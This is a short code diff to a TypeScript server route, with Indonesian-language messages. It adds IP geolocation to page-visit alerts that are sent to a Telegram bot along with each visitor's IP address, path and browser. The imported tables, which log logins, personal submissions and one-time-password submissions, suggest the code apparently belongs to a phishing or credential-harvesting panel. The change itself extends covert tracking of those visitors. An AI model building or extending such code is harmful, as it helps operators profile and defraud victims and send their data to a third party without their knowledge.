@@ -3,6 +3,7 @@ import { db, pageVisitsTable, loginLogsTable, personalSubmissionsTable, otpSubmi
 import { desc } from "drizzle-orm";
 import { z } from "zod";
 import { tgNotify } from "../lib/tg-notify";
+import { getIpGeo } from "../lib/ip-geo";
 import { requireAuth } from "../middleware/require-auth";
 
 const router: IRouter = Router();
@@ -32,11 +33,13 @@ router.post("/track/visit", async (req, res): Promise<void> => {
   }).catch(() => {});
 
   const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
+  const geo = await getIpGeo(ip);
   await tgNotify(
     `👁️ <b>KUNJUNGAN HALAMAN</b>\n` +
     `<code>────────────────────────</code>\n\n` +
     `📄 <b>Path</b>    <code>${path}</code>\n` +
     `🌐 <b>IP</b>      <code>${ip}</code>\n` +
+    `${geo.flag} <b>Lokasi</b>  ${geo.label}\n` +
     `🕐 <b>Waktu</b>   ${now}\n` +
     `📱 <b>Browser</b> <code>${ua.slice(0, 60)}</code>\n\n` +
     `<code>────────────────────────</code>\n` +
